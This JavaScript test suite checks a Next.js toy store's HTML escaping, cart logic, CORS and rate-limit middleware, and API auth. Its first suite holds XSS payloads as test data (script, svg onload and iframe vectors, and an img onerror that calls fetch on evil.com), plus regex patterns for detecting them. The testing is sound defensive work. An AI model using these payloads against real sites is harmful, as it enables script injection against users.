/**
 * Empirical Adversarial Edge-Case & Invariant Verification Suite
 * Project: rangaroo-store
 * Challenger: Challenger 2
 */

import path from 'path';
import { fileURLToPath } from 'url';
import { createJiti } from 'jiti';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const projectRoot = path.resolve(__dirname, '..');

const jiti = createJiti(projectRoot, {
  alias: {
    '@': projectRoot,
  },
});

// Setup in-memory localStorage mock for Zustand persist testing
const mockStorage = new Map();
global.window = {
  localStorage: {
    getItem: (k) => mockStorage.get(k) || null,
    setItem: (k, v) => mockStorage.set(k, String(v)),
    removeItem: (k) => mockStorage.delete(k),
    clear: () => mockStorage.clear(),
  },
};
global.localStorage = global.window.localStorage;

const { NextRequest } = jiti('next/server');

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;
const failures = [];

function assert(condition, testName, details = '') {
  totalTests++;
  if (condition) {
    passedTests++;
    console.log(`  [PASS] ${testName}`);
  } else {
    failedTests++;
    console.error(`  [FAIL] ${testName} - ${details}`);
    failures.push({ testName, details });
  }
}

async function runSuite1() {
  console.log('\n======================================================');
  console.log('SUITE 1: HTML Entity Escaping & XSS Vectors in lib/email.ts');
  console.log('======================================================');

  const { escapeHtml, sendOrderConfirmationEmail } = jiti('./lib/email.ts');

  // 1.1 Basic tags
  assert(
    escapeHtml('<script>alert(1)</script>') === '&lt;script&gt;alert(1)&lt;/script&gt;',
    '1.1 Escape basic <script> tag'
  );

  // 1.2 Attribute injection with double quotes
  assert(
    escapeHtml('" onmouseover="alert(\'xss\')') === '&quot; onmouseover=&quot;alert(&#039;xss&#039;)',
    '1.2 Escape double quotes and event handlers'
  );

  // 1.3 Single quote escaping
  assert(
    escapeHtml("' onclick='bad()") === '&#039; onclick=&#039;bad()',
    '1.3 Escape single quotes'
  );

  // 1.4 Ampersands
  assert(
    escapeHtml('Tom & Jerry') === 'Tom &amp; Jerry',
    '1.4 Escape ampersands'
  );

  // 1.5 Nested entities & mixed characters
  assert(
    escapeHtml('<div id="box" data-val=\'1 & 2\'>Test</div>') ===
      '&lt;div id=&quot;box&quot; data-val=&#039;1 &amp; 2&#039;&gt;Test&lt;/div&gt;',
    '1.5 Escape complex HTML element with attributes'
  );

  // 1.6 SVG XSS vectors
  assert(
    escapeHtml('"><svg onload=alert(1)>') === '&quot;&gt;&lt;svg onload=alert(1)&gt;',
    '1.6 Escape SVG onload vector'
  );

  // 1.7 Image OnError vector
  assert(
    escapeHtml('<img src=x onerror="fetch(\'http://evil.com/\')"/>') ===
      '&lt;img src=x onerror=&quot;fetch(&#039;http://evil.com/&#039;)&quot;/&gt;',
    '1.7 Escape <img> onerror vector'
  );

  // 1.8 Empty string handling
  assert(escapeHtml('') === '', '1.8 Empty string returns empty string');

  // 1.9 Null handling (boundary condition)
  assert(escapeHtml(null) === '', '1.9 Null input returns empty string');

  // 1.10 Undefined handling (boundary condition)
  assert(escapeHtml(undefined) === '', '1.10 Undefined input returns empty string');

  // 1.11 Zero number handling (falsy boundary)
  assert(escapeHtml(0) === '', '1.11 Falsy 0 returns empty string');

  // 1.12 End-to-end template injection test
  // Mock global fetch to capture email HTML content
  const originalFetch = global.fetch;
  let interceptedHtml = '';
  let interceptedPayload = null;

  global.fetch = async (url, options) => {
    if (url === 'https://api.brevo.com/v3/smtp/email') {
      interceptedPayload = JSON.parse(options.body);
      interceptedHtml = interceptedPayload.htmlContent;
      return {
        ok: true,
        status: 200,
        json: async () => ({ messageId: '<mock-msg-id-12345>' }),
      };
    }
    return originalFetch(url, options);
  };

  process.env.BREVO_API_KEY = 'test-dummy-brevo-api-key';

  const maliciousOrder = {
    id: 'ord_123',
    orderNumber: '"><script>alert("orderNum")</script>',
    status: 'pending',
    paymentStatus: 'paid',
    customerEmail: 'victim@example.com',
    subtotal: 500,
    shippingFee: 0,
    discountAmount: 0,
    total: 500,
    shippingAddress: {
      fullName: '<b onfocus=alert("name")>Attacker</b>',
      addressLine1: '"><script>alert("addr1")</script>',
      addressLine2: '<svg onload=alert("addr2")>',
      city: '"><img src=x onerror=alert("city")>',
      state: '"><iframe src=javascript:alert("state")>',
      pincode: '<script>alert("pin")</script>',
      phone: '"><script>alert("phone")</script>',
    },
    items: [
      {
        productId: 'prod_1',
        productName: '<script>alert("productName")</script>',
        quantity: 2,
        unitPrice: 250,
        totalPrice: 500,
      },
    ],
  };

  try {
    const emailResult = await sendOrderConfirmationEmail(maliciousOrder);
    assert(emailResult.success === true, '1.12.1 sendOrderConfirmationEmail succeeds with sanitized payload');

    // Verify absence of unescaped HTML tags in generated email body
    const dangerousPatterns = [
      /<script[\s>]/i,
      /<\/script>/i,
      /<svg[\s>]/i,
      /<img[\s>]/i,
      /<b\s+on/i,
      /<iframe[\s>]/i,
      /<[a-zA-Z]+[^>]*\s+on[a-z]+\s*=/i,
      /<[a-zA-Z]+[^>]*\s+src\s*=\s*['"]?javascript:/i,
    ];

    let hasUnescapedTag = false;
    for (const pat of dangerousPatterns) {
      const match = interceptedHtml.match(pat);
      if (match) {
        hasUnescapedTag = true;
        console.error(`    Dangerous unescaped pattern matched in email HTML: ${pat} -> Match: "${match[0]}"`);
      }
    }
    assert(!hasUnescapedTag, '1.12.2 All XSS payloads are neutralized and entity-escaped in email HTML');

    // Verify that escaped versions actually exist in the HTML
    assert(
      interceptedHtml.includes('&lt;script&gt;alert(&quot;orderNum&quot;)&lt;/script&gt;'),
      '1.12.3 Order number is correctly escaped'
    );
    assert(
      interceptedHtml.includes('&lt;b onfocus=alert(&quot;name&quot;)&gt;Attacker&lt;/b&gt;'),
      '1.12.4 Recipient name is correctly escaped'
    );
    assert(
      interceptedHtml.includes('&lt;script&gt;alert(&quot;productName&quot;)&lt;/script&gt;'),
      '1.12.5 Product name is correctly escaped'
    );
  } finally {
    global.fetch = originalFetch;
    delete process.env.BREVO_API_KEY;
  }
}

async function runSuite2() {
  console.log('\n======================================================');
  console.log('SUITE 2: CartStore Invariants & Edge Cases in store/cartStore.ts');
  console.log('======================================================');

  const { useCartStore } = jiti('./store/cartStore.ts');

  // Reset cart before starting
  useCartStore.getState().clearCart();
  useCartStore.getState().setGiftWrap(false);
  useCartStore.getState().setGiftMessage('');

  // 2.1 Default threshold (499) with empty cart
  assert(useCartStore.getState().getSubtotal() === 0, '2.1.1 Empty cart subtotal is 0');
  assert(useCartStore.getState().getShippingFee() === 0, '2.1.2 Empty cart shipping fee is 0 (free shipping invariant)');
  assert(useCartStore.getState().getTotal() === 0, '2.1.3 Empty cart total is 0');
  assert(useCartStore.getState().getItemCount() === 0, '2.1.4 Empty cart item count is 0');

  // 2.2 Adding items and threshold checking
  const testProduct1 = {
    id: 'prod-item-1',
    name: 'Dino Kit',
    slug: 'dino-kit',
    price: 200,
    images: ['/dino.jpg'],
    categoryId: 'fun',
    collectionId: 'dino',
    kitContents: [],
    ageGroup: '5+',
    difficulty: 'beginner',
    paintType: 'tempera',
    figureCount: 1,
    figureSize: 'medium',
    weightGrams: 200,
    stockQuantity: 10,
    isActive: true,
    isFeatured: false,
    tags: [],
  };

  // Add 1 item -> subtotal = 200 (< 499 threshold)
  useCartStore.getState().addItem(testProduct1, 1);
  assert(useCartStore.getState().getSubtotal() === 200, '2.2.1 Subtotal is 200 after adding 1 item');
  assert(useCartStore.getState().getShippingFee() === 60, '2.2.2 Shipping fee is 60 when subtotal (200) < default threshold (499)');
  assert(useCartStore.getState().getShippingFee(undefined) === 60, '2.2.3 Shipping fee with undefined threshold defaults to 499 -> 60');
  assert(useCartStore.getState().getTotal() === 260, '2.2.4 Total is 260 (200 + 60)');

  // Custom lower threshold: subtotal 200 >= threshold 200 -> free shipping
  assert(useCartStore.getState().getShippingFee(200) === 0, '2.2.5 Shipping fee with threshold=200 is 0');
  assert(useCartStore.getState().getTotal(200) === 200, '2.2.6 Total with threshold=200 is 200');

  // Boundary: threshold = 0
  assert(useCartStore.getState().getShippingFee(0) === 0, '2.2.7 Shipping fee with threshold=0 is 0');

  // Boundary: negative threshold (-50)
  assert(useCartStore.getState().getShippingFee(-50) === 0, '2.2.8 Shipping fee with threshold=-50 is 0');

  // Boundary: threshold = Infinity
  assert(useCartStore.getState().getShippingFee(Infinity) === 60, '2.2.9 Shipping fee with threshold=Infinity is 60');

  // Boundary: threshold = NaN
  assert(useCartStore.getState().getShippingFee(NaN) === 60, '2.2.10 Shipping fee with threshold=NaN falls back to 60');

  // Add more items to reach threshold: 2 more of prod-1 -> subtotal = 600 (>= 499)
  useCartStore.getState().addItem(testProduct1, 2);
  assert(useCartStore.getState().getSubtotal() === 600, '2.2.11 Subtotal is 600 after adding 2 more items');
  assert(useCartStore.getState().getShippingFee() === 0, '2.2.12 Shipping fee is 0 when subtotal (600) >= threshold (499)');
  assert(useCartStore.getState().getTotal() === 600, '2.2.13 Total is 600 with free shipping');

  // 2.3 Gift Wrap edge cases
  useCartStore.getState().setGiftWrap(true);
  assert(useCartStore.getState().getGiftWrapFee() === 30, '2.3.1 Gift wrap fee is 30 when isGiftWrapped=true');
  assert(useCartStore.getState().getTotal() === 630, '2.3.2 Total includes 30 gift wrap fee (600 + 0 + 30 = 630)');

  useCartStore.getState().setGiftWrap(false);
  assert(useCartStore.getState().getGiftWrapFee() === 0, '2.3.3 Gift wrap fee is 0 when isGiftWrapped=false');

  // 2.4 Quantity updates with zero, negative, and large quantities
  // Update to valid quantity: 5
  useCartStore.getState().updateQuantity('prod-item-1', 5);
  assert(useCartStore.getState().items[0]?.quantity === 5, '2.4.1 updateQuantity to 5 sets quantity to 5');

  // Update to boundary quantity: 10
  useCartStore.getState().updateQuantity('prod-item-1', 10);
  assert(useCartStore.getState().items[0]?.quantity === 10, '2.4.2 updateQuantity to 10 sets quantity to 10');

  // Update to excessive quantity: 15 (should cap at 10)
  useCartStore.getState().updateQuantity('prod-item-1', 15);
  assert(useCartStore.getState().items[0]?.quantity === 10, '2.4.3 updateQuantity to 15 is clamped to max 10');

  // Update to extreme quantity: 9999 (should cap at 10)
  useCartStore.getState().updateQuantity('prod-item-1', 9999);
  assert(useCartStore.getState().items[0]?.quantity === 10, '2.4.4 updateQuantity to 9999 is clamped to max 10');

  // Update to 0 (should remove item)
  useCartStore.getState().updateQuantity('prod-item-1', 0);
  assert(useCartStore.getState().items.length === 0, '2.4.5 updateQuantity to 0 removes item');

  // Add again and test negative quantity removal
  useCartStore.getState().addItem(testProduct1, 1);
  assert(useCartStore.getState().items.length === 1, '2.4.6 Added item back');
  useCartStore.getState().updateQuantity('prod-item-1', -5);
  assert(useCartStore.getState().items.length === 0, '2.4.7 updateQuantity to -5 removes item');

  // 2.5 addItem default parameter and toggleCart
  useCartStore.getState().addItem(testProduct1); // omitted qtyToAdd
  assert(useCartStore.getState().items[0]?.quantity === 1, '2.5.1 addItem without quantity defaults to 1');
  assert(useCartStore.getState().isOpen === true, '2.5.2 addItem automatically opens cart drawer');

  useCartStore.getState().closeCart();
  assert(useCartStore.getState().isOpen === false, '2.5.3 closeCart sets isOpen to false');
  useCartStore.getState().openCart();
  assert(useCartStore.getState().isOpen === true, '2.5.4 openCart sets isOpen to true');
  useCartStore.getState().toggleCart();
  assert(useCartStore.getState().isOpen === false, '2.5.5 toggleCart inverts isOpen');

  // 2.6 Persistence partialize contract (API-07 Verification)
  // Check the serialized state stored in localStorage
  const rawStored = mockStorage.get('rangaroo-cart');
  assert(typeof rawStored === 'string', '2.6.1 CartStore successfully serialized to storage');

  const parsedStored = JSON.parse(rawStored || '{}');
  const storedState = parsedStored.state || {};
  assert(Array.isArray(storedState.items), '2.6.2 Partialize retains items array');
  assert(typeof storedState.isGiftWrapped === 'boolean', '2.6.3 Partialize retains isGiftWrapped boolean');
  assert(typeof storedState.giftMessage === 'string', '2.6.4 Partialize retains giftMessage string');
  assert(storedState.isOpen === undefined, '2.6.5 Partialize excludes ephemeral isOpen UI state (API-07 verified)');

  // Clean up
  useCartStore.getState().clearCart();
}

async function runSuite3() {
  console.log('\n======================================================');
  console.log('SUITE 3: Preflight OPTIONS 204 & Edge Middleware Contracts in middleware.ts');
  console.log('======================================================');

  const { middleware } = jiti('./proxy.ts');

  // Helper to test preflight OPTIONS request
  function testOptionsRequest(url, originHeader) {
    const headers = {};
    if (originHeader) headers['origin'] = originHeader;
    const req = new NextRequest(url, {
      method: 'OPTIONS',
      headers,
    });
    return middleware(req);
  }

  // 3.1 Status 204 contract
  const resAllowed = testOptionsRequest('https://rangaroo.store/api/products', 'https://rangaroo.store');
  assert(resAllowed.status === 204, '3.1.1 Preflight OPTIONS returns HTTP status 204');
  assert(resAllowed.body === null, '3.1.2 Preflight OPTIONS response body is null');

  // 3.2 Allowed origins CORS check
  const allowedOrigins = [
    'https://rangaroo.store',
    'https://www.rangaroo.store',
    'http://localhost:3000',
    'http://localhost',
    'http://127.0.0.1:8080',
    'http://127.0.0.1',
    'https://preview-123.vercel.app',
    'https://sub-domain.vercel.app',
  ];

  for (const origin of allowedOrigins) {
    const res = testOptionsRequest('https://rangaroo.store/api/products', origin);
    assert(
      res.headers.get('Access-Control-Allow-Origin') === origin,
      `3.2 Allowed origin '${origin}' gets Access-Control-Allow-Origin header`
    );
  }

  // 3.3 Disallowed origins CORS check
  const disallowedOrigins = [
    'https://evil.com',
    'https://attacker.com',
    'https://rangaroo.store.evil.com',
    'https://evil-vercel.app.attacker.com',
    'https://attackervercel.app',
    'http://attackerlocalhost:3000',
    'http://127.0.0.1.attacker.com',
  ];

  for (const origin of disallowedOrigins) {
    const res = testOptionsRequest('https://rangaroo.store/api/products', origin);
    assert(
      res.headers.get('Access-Control-Allow-Origin') === null,
      `3.3 Disallowed origin '${origin}' does NOT get Access-Control-Allow-Origin header`
    );
  }

  // 3.4 Missing origin check
  const resNoOrigin = testOptionsRequest('https://rangaroo.store/api/products', null);
  assert(
    resNoOrigin.headers.get('Access-Control-Allow-Origin') === null,
    '3.4 Request without origin header does NOT get Access-Control-Allow-Origin header'
  );

  // 3.5 Required security and CORS headers on 204 response
  assert(
    resAllowed.headers.get('Access-Control-Allow-Methods') === 'GET, POST, PUT, DELETE, OPTIONS',
    '3.5.1 Access-Control-Allow-Methods includes all CRUD and OPTIONS verbs'
  );
  assert(
    resAllowed.headers.get('Access-Control-Allow-Headers') === 'Content-Type, Authorization',
    '3.5.2 Access-Control-Allow-Headers includes Content-Type and Authorization'
  );
  assert(
    resAllowed.headers.get('Access-Control-Allow-Credentials') === 'true',
    '3.5.3 Access-Control-Allow-Credentials is true'
  );
  assert(
    resAllowed.headers.get('Access-Control-Max-Age') === '86400',
    '3.5.4 Access-Control-Max-Age is 86400 (24h cache)'
  );
  assert(
    resAllowed.headers.get('X-Content-Type-Options') === 'nosniff',
    '3.5.5 X-Content-Type-Options is nosniff'
  );
  assert(
    resAllowed.headers.get('X-Frame-Options') === 'SAMEORIGIN',
    '3.5.6 X-Frame-Options is SAMEORIGIN'
  );
  assert(
    resAllowed.headers.get('Referrer-Policy') === 'strict-origin-when-cross-origin',
    '3.5.7 Referrer-Policy is strict-origin-when-cross-origin'
  );

  // 3.6 OPTIONS preflight immunity to rate limiting
  // Simulate 65 requests from a test IP
  const testIp = '203.0.113.42';
  for (let i = 0; i < 62; i++) {
    const req = new NextRequest('https://rangaroo.store/api/products', {
      method: 'GET',
      headers: { 'x-forwarded-for': testIp },
    });
    middleware(req);
  }

  // A 63rd GET request should be rate-limited (429)
  const reqBlocked = new NextRequest('https://rangaroo.store/api/products', {
    method: 'GET',
    headers: { 'x-forwarded-for': testIp },
  });
  const resBlocked = middleware(reqBlocked);
  assert(resBlocked.status === 429, '3.6.1 GET request exceeds rate limit and receives 429');

  // But an OPTIONS request from the exact same IP should STILL return 204!
  const reqOptionsDuringRateLimit = new NextRequest('https://rangaroo.store/api/products', {
    method: 'OPTIONS',
    headers: { 'x-forwarded-for': testIp, origin: 'https://rangaroo.store' },
  });
  const resOptionsImmune = middleware(reqOptionsDuringRateLimit);
  assert(
    resOptionsImmune.status === 204,
    '3.6.2 OPTIONS preflight request bypasses rate limit and succeeds with 204'
  );
}

async function runSuite4() {
  console.log('\n======================================================');
  console.log('SUITE 4: Zero / Negative Inputs, Empty Objects & Malformed Payloads');
  console.log('======================================================');

  // 4.1 /api/email/order-confirmation auth & payload boundary
  const emailRoute = jiti('./app/api/email/order-confirmation/route.ts');

  // Unauthenticated request
  const unauthReq = new NextRequest('http://localhost/api/email/order-confirmation', {
    method: 'POST',
    body: JSON.stringify({}),
  });
  const unauthRes = await emailRoute.POST(unauthReq);
  assert(unauthRes.status === 401, '4.1.1 Unauthenticated POST to email endpoint returns 401');

  // Request with invalid secret
  const badSecretReq = new NextRequest('http://localhost/api/email/order-confirmation', {
    method: 'POST',
    headers: { 'x-internal-secret': 'wrong-secret-token' },
    body: JSON.stringify({}),
  });
  const badSecretRes = await emailRoute.POST(badSecretReq);
  assert(badSecretRes.status === 401, '4.1.2 POST with invalid internal secret returns 401');

  // Authenticated request with empty body
  process.env.INTERNAL_API_SECRET = 'correct-internal-secret-xyz';
  try {
    const emptyBodyReq = new NextRequest('http://localhost/api/email/order-confirmation', {
      method: 'POST',
      headers: { 'x-internal-secret': 'correct-internal-secret-xyz' },
      body: JSON.stringify({}),
    });
    const emptyBodyRes = await emailRoute.POST(emptyBodyReq);
    assert(emptyBodyRes.status === 400, '4.1.3 Authenticated POST with empty body returns 400 (Order data required)');

    const nullOrderReq = new NextRequest('http://localhost/api/email/order-confirmation', {
      method: 'POST',
      headers: { 'x-internal-secret': 'correct-internal-secret-xyz' },
      body: JSON.stringify({ order: null }),
    });
    const nullOrderRes = await emailRoute.POST(nullOrderReq);
    assert(nullOrderRes.status === 400, '4.1.4 Authenticated POST with order: null returns 400');
  } finally {
    delete process.env.INTERNAL_API_SECRET;
  }

  // 4.2 /api/razorpay/verify-payment boundary testing
  const razorpayRoute = jiti('./app/api/razorpay/verify-payment/route.ts');
  process.env.RAZORPAY_KEY_SECRET = 'test_razorpay_secret_123';

  try {
    // Empty body
    const emptyRzpReq = new NextRequest('http://localhost/api/razorpay/verify-payment', {
      method: 'POST',
      body: JSON.stringify({}),
    });
    const emptyRzpRes = await razorpayRoute.POST(emptyRzpReq);
    assert(emptyRzpRes.status === 400, '4.2.1 POST with empty body returns 400');

    // Missing signature
    const missingSigReq = new NextRequest('http://localhost/api/razorpay/verify-payment', {
      method: 'POST',
      body: JSON.stringify({ razorpay_order_id: 'order_123', razorpay_payment_id: 'pay_123' }),
    });
    const missingSigRes = await razorpayRoute.POST(missingSigReq);
    assert(missingSigRes.status === 400, '4.2.2 POST with missing razorpay_signature returns 400');

    // Empty strings
    const emptyStringsReq = new NextRequest('http://localhost/api/razorpay/verify-payment', {
      method: 'POST',
      body: JSON.stringify({ razorpay_order_id: '', razorpay_payment_id: '', razorpay_signature: '' }),
    });
    const emptyStringsRes = await razorpayRoute.POST(emptyStringsReq);
    assert(emptyStringsRes.status === 400, '4.2.3 POST with empty string fields returns 400');

    // Invalid signature with different buffer length (must not throw error in timingSafeEqual!)
    const shortSigReq = new NextRequest('http://localhost/api/razorpay/verify-payment', {
      method: 'POST',
      body: JSON.stringify({
        razorpay_order_id: 'order_123',
        razorpay_payment_id: 'pay_123',
        razorpay_signature: 'short',
      }),
    });
    const shortSigRes = await razorpayRoute.POST(shortSigReq);
    assert(shortSigRes.status === 400, '4.2.4 POST with short signature returns 400 without crashing timingSafeEqual');

    // Invalid signature with exact 64-char length (SHA-256 hex length)
    const forgedSigReq = new NextRequest('http://localhost/api/razorpay/verify-payment', {
      method: 'POST',
      body: JSON.stringify({
        razorpay_order_id: 'order_123',
        razorpay_payment_id: 'pay_123',
        razorpay_signature: '0'.repeat(64),
      }),
    });
    const forgedSigRes = await razorpayRoute.POST(forgedSigReq);
    assert(forgedSigRes.status === 400, '4.2.5 POST with forged 64-char signature returns 400 mismatch');
  } finally {
    delete process.env.RAZORPAY_KEY_SECRET;
  }

  // 4.3 /api/coupons boundary testing
  const couponsRoute = jiti('./app/api/coupons/route.ts');

  // POST without admin auth
  const unauthCouponPost = new NextRequest('http://localhost/api/coupons', {
    method: 'POST',
    body: JSON.stringify({ code: 'SAVE10', discountValue: 10 }),
  });
  const unauthCouponRes = await couponsRoute.POST(unauthCouponPost);
  assert(unauthCouponRes.status === 403, '4.3.1 POST /api/coupons without admin credentials returns 403');

  // DELETE without admin auth
  const unauthCouponDel = new NextRequest('http://localhost/api/coupons?code=SAVE10', {
    method: 'DELETE',
  });
  const unauthCouponDelRes = await couponsRoute.DELETE(unauthCouponDel);
  assert(unauthCouponDelRes.status === 403, '4.3.2 DELETE /api/coupons without admin credentials returns 403');

  // 4.4 /api/products boundary testing
  const productsRoute = jiti('./app/api/products/route.ts');

  // POST without admin auth
  const unauthProdPost = new NextRequest('http://localhost/api/products', {
    method: 'POST',
    body: JSON.stringify({ product: { name: 'Test' } }),
  });
  const unauthProdRes = await productsRoute.POST(unauthProdPost);
  assert(unauthProdRes.status === 403, '4.4.1 POST /api/products without admin credentials returns 403');

  // DELETE without admin auth
  const unauthProdDel = new NextRequest('http://localhost/api/products?id=123', {
    method: 'DELETE',
  });
  const unauthProdDelRes = await productsRoute.DELETE(unauthProdDel);
  assert(unauthProdDelRes.status === 403, '4.4.2 DELETE /api/products without admin credentials returns 403');

  // 4.5 /api/admin/orders boundary testing
  const adminOrdersRoute = jiti('./app/api/admin/orders/route.ts');

  // GET without admin auth
  const unauthOrdersGet = new NextRequest('http://localhost/api/admin/orders', { method: 'GET' });
  const unauthOrdersGetRes = await adminOrdersRoute.GET(unauthOrdersGet);
  assert(unauthOrdersGetRes.status === 403, '4.5.1 GET /api/admin/orders without admin auth returns 403');

  // POST without admin auth
  const unauthOrdersPost = new NextRequest('http://localhost/api/admin/orders', {
    method: 'POST',
    body: JSON.stringify({ order: { id: '1' } }),
  });
  const unauthOrdersPostRes = await adminOrdersRoute.POST(unauthOrdersPost);
  assert(unauthOrdersPostRes.status === 403, '4.5.2 POST /api/admin/orders without admin auth returns 403');

  // PATCH without admin auth
  const unauthOrdersPatch = new NextRequest('http://localhost/api/admin/orders', {
    method: 'PATCH',
    body: JSON.stringify({ orderId: '1', status: 'shipped' }),
  });
  const unauthOrdersPatchRes = await adminOrdersRoute.PATCH(unauthOrdersPatch);
  assert(unauthOrdersPatchRes.status === 403, '4.5.3 PATCH /api/admin/orders without admin auth returns 403');
}

async function main() {
  console.log('Starting Empirical Adversarial Verification Suite...');
  const startTime = Date.now();

  try {
    await runSuite1();
    await runSuite2();
    await runSuite3();
    await runSuite4();
  } catch (err) {
    console.error('Unhandled exception in test harness:', err);
    process.exit(1);
  }

  const durationMs = Date.now() - startTime;
  console.log('\n======================================================');
  console.log(`TEST RUN COMPLETE in ${durationMs}ms`);
  console.log(`Total tests:  ${totalTests}`);
  console.log(`Passed tests: ${passedTests}`);
  console.log(`Failed tests: ${failedTests}`);
  console.log('======================================================');

  if (failedTests > 0) {
    console.error('\nFAILURES SUMMARY:');
    failures.forEach((f, idx) => {
      console.error(`${idx + 1}. ${f.testName}: ${f.details}`);
    });
    process.exit(1);
  } else {
    console.log('\nALL ADVERSARIAL EDGE-CASE & INVARIANT TESTS PASSED CLEANLY.');
    process.exit(0);
  }
}

main();
